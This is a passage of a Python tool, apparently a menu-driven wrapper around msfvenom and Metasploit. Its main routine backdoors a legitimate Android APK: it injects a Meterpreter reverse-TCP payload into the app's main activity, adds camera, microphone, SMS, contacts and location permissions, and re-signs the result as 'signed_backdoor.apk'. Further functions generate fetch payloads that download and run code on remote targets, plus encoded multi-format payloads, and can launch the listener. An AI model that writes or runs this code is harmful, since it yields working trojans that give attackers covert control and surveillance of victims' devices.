            lport = input(f"{Colors.WHITE}Enter LPORT [{self.config['default_lport']}]: {Colors.END}").strip()
            if not lport:
                lport = self.config['default_lport']
            try:
                user_inputs['lport'] = self.sanitize_input(lport, "port")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get payload name with validation
        while True:
            payload_name = input(f"{Colors.WHITE}Enter payload name: {Colors.END}").strip()
            if payload_name:
                try:
                    user_inputs['payload_name'] = self.sanitize_input(payload_name, "filename")
                    break
                except ValueError as e:
                    print(f"{Colors.RED}Error: {e}{Colors.END}")
            else:
                print(f"{Colors.RED}Payload name cannot be empty.{Colors.END}")
        
        # Get original APK path
        while True:
            original_apk = input(f"{Colors.WHITE}Enter path to original APK: {Colors.END}").strip()
            if Path(original_apk).exists():
                break
            print(f"{Colors.RED}File not found: {original_apk}{Colors.END}")
        
        # Get permissions
        print(f"\n{Colors.CYAN}Select permissions to request:{Colors.END}")
        print(f"{Colors.YELLOW}1. Basic (Internet, Network State){Colors.END}")
        print(f"{Colors.YELLOW}2. Basic + Storage{Colors.END}")
        print(f"{Colors.YELLOW}3. Basic + Location{Colors.END}")
        print(f"{Colors.YELLOW}4. Basic + Camera{Colors.END}")
        print(f"{Colors.YELLOW}5. Basic + Microphone{Colors.END}")
        print(f"{Colors.YELLOW}6. Basic + Contacts{Colors.END}")
        print(f"{Colors.YELLOW}7. Basic + SMS{Colors.END}")
        print(f"{Colors.YELLOW}8. Basic + Calls{Colors.END}")
        print(f"{Colors.YELLOW}9. All Permissions{Colors.END}")
        print(f"{Colors.YELLOW}0. Custom Selection{Colors.END}")
        
        permission_options = {
            "1": ["basic"],
            "2": ["basic", "storage"],
            "3": ["basic", "location"],
            "4": ["basic", "camera"],
            "5": ["basic", "microphone"],
            "6": ["basic", "contacts"],
            "7": ["basic", "sms"],
            "8": ["basic", "calls"],
            "9": ["basic", "storage", "location", "camera", "microphone", "contacts", "sms", "calls"]
        }
        
        selected_permissions = []
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            if choice == "0":
                # Custom selection
                print(f"\n{Colors.CYAN}Available permission groups:{Colors.END}")
                groups = list(self.android_configs["permissions"].keys())
                for i, group in enumerate(groups, 1):
                    print(f"{Colors.YELLOW}{i}. {group.title()}{Colors.END}")
                
                while True:
                    group_choice = input(f"{Colors.WHITE}Select permission group (0 to finish): {Colors.END}").strip()
                    if group_choice == "0":
                        break
                    try:
                        group_index = int(group_choice) - 1
                        if 0 <= group_index < len(groups):
                            selected_permissions.extend(
                                self.android_configs["permissions"][groups[group_index]]
                            )
                    except ValueError:
                        pass
                break
            elif choice in permission_options:
                for group in permission_options[choice]:
                    selected_permissions.extend(
                        self.android_configs["permissions"][group]
                    )
                break
            else:
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Create temporary directory for processing
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            
            print(f"\n{Colors.CYAN}Working directory: {temp_path}{Colors.END}")
            
            # Step 1: Generate the raw payload APK
            print(f"\n{Colors.YELLOW}Step 1: Generating raw payload APK...{Colors.END}")
            payload_apk = temp_path / "payload.apk"
            cmd = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={user_inputs['lhost']}",
                f"LPORT={user_inputs['lport']}",
                "-o", str(payload_apk)
            ]
            
            # Open xterm to show the command execution
            terminal = self.get_available_terminal()
            if terminal and terminal == "xterm":
                xterm_cmd = [
                    "xterm",
                    "-title", "Generating Raw Payload",
                    "-geometry", "120x40",
                    "-bg", "black",
                    "-fg", "green",
                    "-e", f"bash -c '{' '.join(cmd)}; echo \"Press Enter to close...\"; read'"
                ]
                subprocess.Popen(xterm_cmd)
                print(f"{Colors.GREEN}✅ Opening xterm to show payload generation{Colors.END}")
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.RED}❌ Failed to generate payload APK{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Payload APK generated: {payload_apk}{Colors.END}")
            
            # Step 2: Decompile payload APK
            print(f"\n{Colors.YELLOW}Step 2: Decompiling payload APK...{Colors.END}")
            payload_src = temp_path / "payload_src"
            cmd = ["apktool", "d", str(payload_apk), "-o", str(payload_src)]
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.RED}❌ Failed to decompile payload APK{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Payload APK decompiled to: {payload_src}{Colors.END}")
            
            # Step 3: Decompile original APK
            print(f"\n{Colors.YELLOW}Step 3: Decompiling original APK...{Colors.END}")
            legit_src = temp_path / "legit_src"
            cmd = ["apktool", "d", original_apk, "-o", str(legit_src)]
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.RED}❌ Failed to decompile original APK{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Original APK decompiled to: {legit_src}{Colors.END}")
            
            # Step 4: Copy payload smali to legitimate app
            print(f"\n{Colors.YELLOW}Step 4: Copying payload smali to legitimate app...{Colors.END}")
            metasploit_smali = payload_src / "smali" / "com" / "metasploit"
            target_smali = legit_src / "smali" / "com"
            
            if not metasploit_smali.exists():
                print(f"{Colors.RED}❌ Metasploit smali directory not found: {metasploit_smali}{Colors.END}")
                return
            
            # Copy the entire metasploit smali directory
            shutil.copytree(metasploit_smali, target_smali / "metasploit")
            print(f"{Colors.GREEN}✅ Copied payload smali to legitimate app{Colors.END}")
            
            # Step 5: Find main activity and inject payload startup code
            print(f"\n{Colors.YELLOW}Step 5: Injecting payload startup code...{Colors.END}")
            
            # Parse AndroidManifest.xml to find main activity
            manifest_path = legit_src / "AndroidManifest.xml"
            main_activity = self.find_main_activity(manifest_path)
            
            if not main_activity:
                print(f"{Colors.RED}❌ Failed to find main activity in AndroidManifest.xml{Colors.END}")
                return
            
            print(f"{Colors.CYAN}Found main activity: {main_activity}{Colors.END}")
            
            # Convert main activity path to smali file path
            main_activity_path = main_activity.replace(".", "/")
            main_activity_smali = legit_src / "smali" / f"{main_activity_path}.smali"
            
            if not main_activity_smali.exists():
                # Try with $ if it's an inner class
                main_activity_smali = legit_src / "smali" / f"{main_activity_path.replace('$', '$$')}.smali"
            
            if not main_activity_smali.exists():
                print(f"{Colors.RED}❌ Main activity smali file not found: {main_activity_smali}{Colors.END}")
                return
            
            # Inject payload startup code
            if not self.inject_payload_startup(main_activity_smali):
                print(f"{Colors.RED}❌ Failed to inject payload startup code{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Injected payload startup code into main activity{Colors.END}")
            
            # Step 6: Add required permissions and service to AndroidManifest.xml
            print(f"\n{Colors.YELLOW}Step 6: Modifying AndroidManifest.xml...{Colors.END}")
            
            if not self.modify_android_manifest(manifest_path, selected_permissions):
                print(f"{Colors.RED}❌ Failed to modify AndroidManifest.xml{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Modified AndroidManifest.xml{Colors.END}")
            
            # Step 7: Rebuild the APK
            print(f"\n{Colors.YELLOW}Step 7: Rebuilding APK...{Colors.END}")
            unsigned_apk = temp_path / "unsigned_backdoor.apk"
            cmd = ["apktool", "b", str(legit_src), "-o", str(unsigned_apk)]
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.RED}❌ Failed to rebuild APK{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Rebuilt APK: {unsigned_apk}{Colors.END}")
            
            # Step 8: Create signing key if it doesn't exist
            print(f"\n{Colors.YELLOW}Step 8: Creating signing key...{Colors.END}")
            keystore_path = Path(self.config.get("android_settings", {}).get("keystore_path", "mykey.keystore"))
            
            if not keystore_path.exists():
                cmd = [
                    "keytool",
                    "-genkey",
                    "-v",
                    "-keystore", str(keystore_path),
                    "-alias", self.config.get("android_settings", {}).get("key_alias", "mykey"),
                    "-keyalg", "RSA",
                    "-keysize", "2048",
                    "-validity", "10000",
                    "-storepass", self.config.get("android_settings", {}).get("keystore_password", "android"),
                    "-keypass", self.config.get("android_settings", {}).get("key_password", "android"),
                    "-dname", "CN=Android, OU=Android, O=Android, L=Android, S=Android, C=US"
                ]
                
                if not self.execute_command(" ".join(cmd)):
                    print(f"{Colors.RED}❌ Failed to create signing key{Colors.END}")
                    return
                
                print(f"{Colors.GREEN}✅ Created signing key: {keystore_path}{Colors.END}")
            else:
                print(f"{Colors.GREEN}✅ Using existing signing key: {keystore_path}{Colors.END}")
            
            # Step 9: Sign the APK
            print(f"\n{Colors.YELLOW}Step 9: Signing APK...{Colors.END}")
            signed_apk = temp_path / "signed_backdoor.apk"
            cmd = [
                "jarsigner",
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", str(keystore_path),
                "-storepass", self.config.get("android_settings", {}).get("keystore_password", "android"),
                "-keypass", self.config.get("android_settings", {}).get("key_password", "android"),
                "-signedjar", str(signed_apk),
                str(unsigned_apk),
                self.config.get("android_settings", {}).get("key_alias", "mykey")
            ]
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.RED}❌ Failed to sign APK{Colors.END}")
                return
            
            print(f"{Colors.GREEN}✅ Signed APK: {signed_apk}{Colors.END}")
            
            # Step 10: Align the APK (optional but recommended)
            print(f"\n{Colors.YELLOW}Step 10: Aligning APK...{Colors.END}")
            final_apk = Path(self.output_dir) / f"{user_inputs['payload_name']}.apk"
            cmd = ["zipalign", "-v", "4", str(signed_apk), str(final_apk)]
            
            if not self.execute_command(" ".join(cmd)):
                print(f"{Colors.YELLOW}⚠️ Warning: Failed to align APK, using signed APK instead{Colors.END}")
                shutil.copy2(signed_apk, final_apk)
            else:
                print(f"{Colors.GREEN}✅ Aligned APK: {final_apk}{Colors.END}")
            
            print(f"\n{Colors.GREEN}🎉 Backdoored APK generated successfully: {final_apk}{Colors.END}")
            print(f"{Colors.CYAN}This APK should work on Android 10-15{Colors.END}")
            
            # Ask if user wants to start handler
            start_handler = input(f"\n{Colors.WHITE}Start Metasploit handler? (Y/n): {Colors.END}").strip().lower()
            if start_handler != "n":
                self.start_metasploit_handler("android/meterpreter/reverse_tcp", user_inputs['lhost'], user_inputs['lport'])
    
    def find_main_activity(self, manifest_path: Path) -> Optional[str]:
        """Find the main activity from AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Find the activity with LAUNCHER intent filter
            for activity in root.findall(".//activity"):
                for intent_filter in activity.findall("intent-filter"):
                    for action in intent_filter.findall("action"):
                        if action.get("name") == "android.intent.action.MAIN":
                            for category in intent_filter.findall("category"):
                                if category.get("name") == "android.intent.category.LAUNCHER":
                                    return activity.get("name")
            
            return None
        except Exception as e:
            logger.error(f"Error parsing AndroidManifest.xml: {e}")
            return None
    
    def inject_payload_startup(self, smali_path: Path) -> bool:
        """Inject payload startup code into the main activity smali file."""
        try:
            with open(smali_path, 'r') as f:
                content = f.read()
            
            # Find the onCreate method
            onCreate_pattern = r'\.method protected onCreate\(Landroid/os/Bundle;\)V'
            match = re.search(onCreate_pattern, content)
            
            if not match:
                print(f"{Colors.RED}❌ Could not find onCreate method in {smali_path}{Colors.END}")
                return False
            
            # Find the position after super.onCreate call
            super_pattern = r'invoke-super \{p[0-9]\}, Landroid/app/Activity;->onCreate\(Landroid/os/Bundle;\)V'
            super_match = re.search(super_pattern, content[match.end():])
            
            if not super_match:
                print(f"{Colors.RED}❌ Could not find super.onCreate call in {smali_path}{Colors.END}")
                return False
            
            # Calculate the position to insert the payload startup code
            insert_pos = match.end() + super_match.end()
            
            # Insert the payload startup code
            payload_code = "\n\n    invoke-static {}, Lcom/metasploit/stage/Payload;->start()V\n"
            new_content = content[:insert_pos] + payload_code + content[insert_pos:]
            
            # Write the modified content back to the file
            with open(smali_path, 'w') as f:
                f.write(new_content)
            
            return True
        except Exception as e:
            logger.error(f"Error injecting payload startup code: {e}")
            return False
    
    def modify_android_manifest(self, manifest_path: Path, permissions: List[str]) -> bool:
        """Add required permissions and service to AndroidManifest.xml."""
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            
            # Add required permissions
            existing_permissions = set()
            for perm in root.findall("uses-permission"):
                existing_permissions.add(perm.get("name"))
            
            # Always add internet permission if not present
            if "android.permission.INTERNET" not in existing_permissions:
                perm = ET.Element("uses-permission")
                perm.set("android:name", "android.permission.INTERNET")
                root.insert(0, perm)
            
            # Add selected permissions
            for perm_group in permissions:
                if perm_group in self.android_configs["permissions"]:
                    for perm_name in self.android_configs["permissions"][perm_group]:
                        if perm_name not in existing_permissions:
                            perm = ET.Element("uses-permission")
                            perm.set("android:name", perm_name)
                            root.insert(0, perm)
            
            # Add the payload service
            application = root.find("application")
            if application is not None:
                # Check if service already exists
                service_exists = False
                for service in application.findall("service"):
                    if service.get("name") == "com.metasploit.stage.Payload":
                        service_exists = True
                        break
                
                if not service_exists:
                    service = ET.Element("service")
                    service.set("android:name", "com.metasploit.stage.Payload")
                    service.set("android:enabled", "true")
                    service.set("android:exported", "false")
                    application.append(service)
            
            # Write the modified manifest back
            tree.write(manifest_path, encoding="utf-8", xml_declaration=True)
            
            return True
        except Exception as e:
            logger.error(f"Error modifying AndroidManifest.xml: {e}")
            return False
    
    def generate_fetch_payload(self) -> None:
        """Generate a fetch payload with full functionality."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}FETCH PAYLOAD GENERATION{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.CYAN}Fetch payloads generate commands that can be executed on remote systems{Colors.END}")
        print(f"{Colors.CYAN}to download and execute payloads automatically.{Colors.END}")
        
        # Get platform
        platforms = {
            "1": "windows",
            "2": "linux", 
            "3": "android",
            "4": "macos"
        }
        
        print(f"\n{Colors.CYAN}Select target platform:{Colors.END}")
        print(f"{Colors.YELLOW}1. Windows{Colors.END}")
        print(f"{Colors.YELLOW}2. Linux{Colors.END}")
        print(f"{Colors.YELLOW}3. Android{Colors.END}")
        print(f"{Colors.YELLOW}4. macOS{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice (1-4): {Colors.END}").strip()
            if choice in platforms:
                platform = platforms[choice]
                break
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get fetch payload configuration
        configs = self.payload_configs[platform]
        
        if "fetch" not in configs:
            print(f"\n{Colors.RED}❌ Fetch payloads are not supported for {platform}{Colors.END}")
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}Select fetch protocol for {platform}:{Colors.END}")
        protocols = list(configs["fetch"].keys())
        for i, protocol in enumerate(protocols, 1):
            print(f"{Colors.YELLOW}{i}. {protocol.upper()}{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            try:
                protocol_index = int(choice) - 1
                if 0 <= protocol_index < len(protocols):
                    protocol = protocols[protocol_index]
                    break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get user inputs
        user_inputs = {}
        
        # Get LHOST with auto-detection
        auto_ip = self.get_system_ip() if self.config.get('auto_detect_ip', True) else self.config.get('default_lhost', '192.168.1.100')
        while True:
            lhost = input(f"{Colors.WHITE}Enter LHOST [{auto_ip}]: {Colors.END}").strip()
            if not lhost:
                lhost = auto_ip
            try:
                user_inputs['lhost'] = self.sanitize_input(lhost, "ip")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get LPORT with validation
        while True:
            lport = input(f"{Colors.WHITE}Enter LPORT [{self.config['default_lport']}]: {Colors.END}").strip()
            if not lport:
                lport = self.config['default_lport']
            try:
                user_inputs['lport'] = self.sanitize_input(lport, "port")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get payload name with validation
        while True:
            payload_name = input(f"{Colors.WHITE}Enter payload name: {Colors.END}").strip()
            if payload_name:
                try:
                    user_inputs['payload_name'] = self.sanitize_input(payload_name, "filename")
                    break
                except ValueError as e:
                    print(f"{Colors.RED}Error: {e}{Colors.END}")
            else:
                print(f"{Colors.RED}Payload name cannot be empty.{Colors.END}")
        
        # Get additional fetch options
        print(f"\n{Colors.CYAN}Fetch Payload Options:{Colors.END}")
        fetch_srvhost = input(f"{Colors.WHITE}Fetch server host [{user_inputs['lhost']}]: {Colors.END}").strip()
        if not fetch_srvhost:
            fetch_srvhost = user_inputs['lhost']
        
        fetch_srvport = input(f"{Colors.WHITE}Fetch server port [8080]: {Colors.END}").strip()
        if not fetch_srvport:
            fetch_srvport = "8080"
        
        # Build the fetch payload command
        payload = configs["fetch"][protocol]
        
        command = (
            f"msfvenom -p {payload} "
            f"LHOST={user_inputs['lhost']} "
            f"LPORT={user_inputs['lport']} "
            f"FETCH_SRVHOST={fetch_srvhost} "
            f"FETCH_SRVPORT={fetch_srvport} "
            f"-f raw"
        )
        
        print(f"\n{Colors.CYAN}Generated command: {Colors.END}{Colors.YELLOW}{command}{Colors.END}")
        
        # Open xterm to show the command execution
        terminal = self.get_available_terminal()
        if terminal and terminal == "xterm":
            xterm_cmd = [
                "xterm",
                "-title", "Fetch Payload Generation",
                "-geometry", "120x40",
                "-bg", "black",
                "-fg", "green",
                "-e", f"bash -c '{command}; echo \"Press Enter to close...\"; read'"
            ]
            subprocess.Popen(xterm_cmd)
            print(f"{Colors.GREEN}✅ Opening xterm to show payload generation{Colors.END}")
        
        if self.execute_command(command):
            print(f"\n{Colors.GREEN}✅ Fetch payload generated successfully{Colors.END}")
            print(f"{Colors.CYAN}The command to execute on the target system will be displayed when you start the handler.{Colors.END}")
            
            # Ask if user wants to start handler
            start_handler = input(f"{Colors.WHITE}Start Metasploit handler? (Y/n): {Colors.END}").strip().lower()
            if start_handler != "n":
                self.start_metasploit_handler(payload, user_inputs['lhost'], user_inputs['lport'])
        else:
            print(f"\n{Colors.RED}❌ Failed to generate fetch payload{Colors.END}")
    
    def generate_multi_format_payload(self) -> None:
        """Generate multiple formats of the same payload."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}MULTI-FORMAT PAYLOAD GENERATION{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        # Get platform and payload type
        platforms = {
            "1": "windows",
            "2": "linux", 
            "3": "android",
            "4": "macos",
            "5": "ios"
        }
        
        print(f"\n{Colors.CYAN}Select target platform:{Colors.END}")
        print(f"{Colors.YELLOW}1. Windows{Colors.END}")
        print(f"{Colors.YELLOW}2. Linux{Colors.END}")
        print(f"{Colors.YELLOW}3. Android{Colors.END}")
        print(f"{Colors.YELLOW}4. macOS{Colors.END}")
        print(f"{Colors.YELLOW}5. iOS{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice (1-5): {Colors.END}").strip()
            if choice in platforms:
                platform = platforms[choice]
                break
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        configs = self.payload_configs[platform]
        
        print(f"\n{Colors.CYAN}Select payload type for {platform}:{Colors.END}")
        print(f"{Colors.YELLOW}1. Meterpreter (recommended){Colors.END}")
        print(f"{Colors.YELLOW}2. Shell{Colors.END}")
        
        payload_types = ["meterpreter", "shell"]
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            try:
                type_index = int(choice) - 1
                if 0 <= type_index < len(payload_types):
                    payload_type = payload_types[type_index]
                    break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get staged vs non-staged
        print(f"\n{Colors.CYAN}Select payload type:{Colors.END}")
        print(f"{Colors.YELLOW}1. Staged (smaller initial payload){Colors.END}")
        print(f"{Colors.YELLOW}2. Non-staged (single larger payload){Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            if choice == "1":
                payload_stage = "staged"
                break
            elif choice == "2":
                payload_stage = "non_staged"
                break
            else:
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get connection method
        print(f"\n{Colors.CYAN}Select connection method for {payload_type}:{Colors.END}")
        methods = list(configs[payload_type][payload_stage].keys())
        for i, method in enumerate(methods, 1):
            print(f"{Colors.YELLOW}{i}. {method}{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            try:
                method_index = int(choice) - 1
                if 0 <= method_index < len(methods):
                    method = methods[method_index]
                    break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get user inputs
        user_inputs = {}
        
        # Get LHOST with auto-detection
        auto_ip = self.get_system_ip() if self.config.get('auto_detect_ip', True) else self.config.get('default_lhost', '192.168.1.100')
        while True:
            lhost = input(f"{Colors.WHITE}Enter LHOST [{auto_ip}]: {Colors.END}").strip()
            if not lhost:
                lhost = auto_ip
            try:
                user_inputs['lhost'] = self.sanitize_input(lhost, "ip")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get LPORT with validation
        while True:
            lport = input(f"{Colors.WHITE}Enter LPORT [{self.config['default_lport']}]: {Colors.END}").strip()
            if not lport:
                lport = self.config['default_lport']
            try:
                user_inputs['lport'] = self.sanitize_input(lport, "port")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get payload name with validation
        while True:
            payload_name = input(f"{Colors.WHITE}Enter payload name: {Colors.END}").strip()
            if payload_name:
                try:
                    user_inputs['payload_name'] = self.sanitize_input(payload_name, "filename")
                    break
                except ValueError as e:
                    print(f"{Colors.RED}Error: {e}{Colors.END}")
            else:
                print(f"{Colors.RED}Payload name cannot be empty.{Colors.END}")
        
        # Get encoding options
        encoding_options = {}
        
        # Ask about encoding
        use_encoding = input(f"{Colors.WHITE}Use encoding? (y/N): {Colors.END}").strip().lower()
        if use_encoding == 'y':
            print(f"\n{Colors.CYAN}Available encoders:{Colors.END}")
            for i, encoder in enumerate(self.encoders, 1):
                print(f"{Colors.YELLOW}{i}. {encoder}{Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Select encoder (1-4): {Colors.END}").strip()
                try:
                    encoder_index = int(choice) - 1
                    if 0 <= encoder_index < len(self.encoders):
                        encoding_options['encoder'] = self.encoders[encoder_index]
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
            
            # Get iterations
            while True:
                iterations = input(f"{Colors.WHITE}Enter encoding iterations (1-5): {Colors.END}").strip()
                try:
                    iterations = int(iterations)
                    if 1 <= iterations <= 5:
                        encoding_options['iterations'] = iterations
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Iterations must be between 1 and 5.{Colors.END}")
        
        # Generate for all available formats
        formats = configs["formats"]
        print(f"\n{Colors.CYAN}Generating payload in {len(formats)} formats...{Colors.END}")
        
        success_count = 0
        for fmt in formats:
            # Build the command for this format
            payload = configs[payload_type][payload_stage][method]
            
            # Start building the command
            cmd_parts = ["msfvenom", "-p", payload]
            
            # Add LHOST and LPORT
            cmd_parts.extend([f"LHOST={user_inputs['lhost']}", f"LPORT={user_inputs['lport']}"])
            
            # Add encoding options
            if 'encoder' in encoding_options:
                cmd_parts.extend(["-e", encoding_options['encoder']])
                if 'iterations' in encoding_options:
                    cmd_parts.extend(["-i", str(encoding_options['iterations'])])
            
            # Add format
            cmd_parts.extend(["-f", fmt])
            
            # Add output file
            output_file = f"{self.output_dir}/{user_inputs['payload_name']}.{fmt}"
            cmd_parts.extend(["-o", output_file])
            
            command = " ".join(cmd_parts)
            
            print(f"{Colors.CYAN}Generating {fmt} format...{Colors.END}")
            if self.execute_command(command):
                print(f"{Colors.GREEN}✅ Generated: {output_file}{Colors.END}")
                success_count += 1
            else:
                print(f"{Colors.RED}❌ Failed to generate {fmt} format{Colors.END}")
        
        print(f"\n{Colors.CYAN}Summary: {Colors.END}{Colors.GREEN}{success_count}/{len(formats)}{Colors.END}{Colors.CYAN} formats generated successfully{Colors.END}")
        
        # Ask if user wants to start handler
        if success_count > 0:
            start_handler = input(f"{Colors.WHITE}Start Metasploit handler? (Y/n): {Colors.END}").strip().lower()
            if start_handler != "n":
                payload = configs[payload_type][payload_stage][method]
                self.start_metasploit_handler(payload, user_inputs['lhost'], user_inputs['lport'])
    
    def apply_android_workarounds(self, payload_file: str, target_sdk: str, evasion: str) -> str:
        """Apply Android-specific workarounds to improve compatibility."""
        # For now, just return the original file
        # In a more advanced version, this would modify the APK
        print(f"{Colors.YELLOW}Note: Applied compatibility workarounds for {target_sdk}{Colors.END}")
        return payload_file
    
    def create_wrapper_apk(self, original_apk: str, wrapper_apk: str, target_sdk: str) -> bool:
        """Create a wrapper APK that binds the payload to a legitimate application."""
        # For now, just copy the original file
        # In a more advanced version, this would create a proper wrapper
        try:
            original_path = Path(original_apk)
            wrapper_path = Path(self.output_dir) / wrapper_apk
            shutil.copy2(original_path, wrapper_path)
            print(f"{Colors.GREEN}Created wrapper APK: {wrapper_path}{Colors.END}")
            return True
        except Exception as e:
            logger.error(f"Failed to create wrapper APK: {e}")
            return False
    
    def execute_command(self, command: str) -> bool:
        """Execute the msfvenom command safely."""
        try:
            logger.info(f"Executing command: {command}")
            
            # Use subprocess.run for better security
            result = subprocess.run(
                command,
                shell=True,
                check=True,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            if result.returncode == 0:
                logger.info("Payload generated successfully")
                if result.stdout:
                    print(f"{Colors.CYAN}Output: {Colors.END}{result.stdout}")
                return True
            else:
                logger.error(f"Command failed with return code {result.returncode}")
                logger.error(f"Error: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            logger.error("Command timed out")
            return False
        except subprocess.CalledProcessError as e:
            logger.error(f"Command execution failed: {e}")
            logger.error(f"Error output: {e.stderr}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            return False
    
    def sanitize_input(self, input_str: str, input_type: str = "general") -> str:
        """Sanitize user input based on type."""
        if not isinstance(input_str, str):
            raise ValueError("Input must be a string")
        
        input_str = input_str.strip()
        
        if input_type == "ip":
            # Basic IP validation
            parts = input_str.split('.')
            if len(parts) != 4 or not all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
                raise ValueError("Invalid IP address format")
        elif input_type == "port":
            if not input_str.isdigit() or not (1 <= int(input_str) <= 65535):
                raise ValueError("Port must be between 1 and 65535")
        elif input_type == "filename":
            # Remove dangerous characters
            dangerous_chars = ['/', '\\', ':', '*', '?', '"', '<', '>', '|']
            for char in dangerous_chars:
                input_str = input_str.replace(char, '')
            if not input_str:
                raise ValueError("Filename cannot be empty after sanitization")
        
        return input_str
    
    def configure_settings(self) -> None:
        """Configure default settings."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}CONFIGURE SETTINGS{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        print(f"{Colors.CYAN}Current settings:{Colors.END}")
        for key, value in self.config.items():
            print(f"  {Colors.YELLOW}{key}: {value}{Colors.END}")
        
        print(f"\n{Colors.CYAN}Enter new values (leave blank to keep current):{Colors.END}")
        
        # Update each setting
        new_lhost = input(f"{Colors.WHITE}Default LHOST [{self.config['default_lhost']}]: {Colors.END}").strip()
        if new_lhost:
            try:
                self.config['default_lhost'] = self.sanitize_input(new_lhost, "ip")
            except ValueError as e:
                print(f"{Colors.RED}Invalid IP address: {e}{Colors.END}")
        
        new_lport = input(f"{Colors.WHITE}Default LPORT [{self.config['default_lport']}]: {Colors.END}").strip()
        if new_lport:
            try:
                self.config['default_lport'] = self.sanitize_input(new_lport, "port")
            except ValueError as e:
                print(f"{Colors.RED}Invalid port: {e}{Colors.END}")
        
        new_encoder = input(f"{Colors.WHITE}Default encoder [{self.config['default_encoder']}]: {Colors.END}").strip()
        if new_encoder and new_encoder in self.encoders:
            self.config['default_encoder'] = new_encoder
        
        new_format = input(f"{Colors.WHITE}Default format [{self.config['default_format']}]: {Colors.END}").strip()
        if new_format:
            self.config['default_format'] = new_format
        
        auto_handler = input(f"{Colors.WHITE}Auto-start handler? (Y/n): {Colors.END}").strip().lower()
        self.config['auto_start_handler'] = auto_handler != "n"
        
        # Android settings
        print(f"\n{Colors.CYAN}Android Settings:{Colors.END}")
        android_settings = self.config.get("android_settings", {})
        
        keystore_path = input(f"{Colors.WHITE}Keystore path [{android_settings.get('keystore_path', 'mykey.keystore')}]: {Colors.END}").strip()
        if keystore_path:
            android_settings['keystore_path'] = keystore_path
        
        keystore_pass = input(f"{Colors.WHITE}Keystore password [{android_settings.get('keystore_password', 'android')}]: {Colors.END}").strip()
        if keystore_pass:
            android_settings['keystore_password'] = keystore_pass
        
        key_alias = input(f"{Colors.WHITE}Key alias [{android_settings.get('key_alias', 'mykey')}]: {Colors.END}").strip()
        if key_alias:
            android_settings['key_alias'] = key_alias
        
        key_pass = input(f"{Colors.WHITE}Key password [{android_settings.get('key_password', 'android')}]: {Colors.END}").strip()
        if key_pass:
            android_settings['key_password'] = key_pass
        
        self.config['android_settings'] = android_settings
        
        self.save_config()
        print(f"\n{Colors.GREEN}✅ Settings saved successfully!{Colors.END}")
    
    def save_preset_config(self) -> None:
        """Save current configuration as a preset."""
        name = input(f"{Colors.WHITE}Enter preset name: {Colors.END}").strip()
        if name:
            preset_file = f"preset_{name}.json"
            try:
                with open(preset_file, 'w') as f:
                    json.dump(self.config, f, indent=2)
